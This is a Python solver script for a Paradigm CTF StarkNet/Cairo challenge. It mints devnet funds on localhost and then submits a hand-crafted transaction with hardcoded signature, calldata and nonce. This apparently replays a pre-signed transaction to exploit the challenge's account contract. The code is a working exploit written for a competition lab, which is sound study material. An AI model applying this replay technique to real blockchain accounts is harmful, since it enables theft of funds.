from json import dumps

from paradigmctf.cairo_challenge import *
from requests import post
from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.models import InvokeFunction


async def solver(client: AccountClient, erc20_contract: Contract):
    post(
        url="http://127.0.0.1:5050/mint",
        headers={"Content-Type": "application/json"},
        data=dumps(
            {
                "amount": 2 * int(0x2386F26FC10001),
                "address": "0x7691c92a418d31d4f7edade9ae5beef41f7ea84f9a0417758bbc678239c9781",
            }
        ),
        auth=(client.client.net.split(sep="@")[0][7:], ""),
    )

    tx = InvokeFunction(
        version=1,
        max_fee=0x2386F26FC10001,
        signature=[
            1206893185686769521420377687289253358051163198888210897589372973683723451882,
            1580303220521000123135449059592146002108153839165515254988050815119880496796,
        ],
        calldata=[
            1,
            2918100574346954010644265649707387672031228676165293396147337117295520924682,
            1791751627143111403081714187534653215500924002095976728725139879597825648416,
            0,
            0,
            0,
        ],
        contract_address=0x7691C92A418D31D4F7EDADE9AE5BEEF41F7EA84F9A0417758BBC678239C9781,
        nonce=0,
    )
    sent_tx = await client.send_transaction(tx)
    await client.wait_for_tx(sent_tx.transaction_hash)


run_solver(solver)
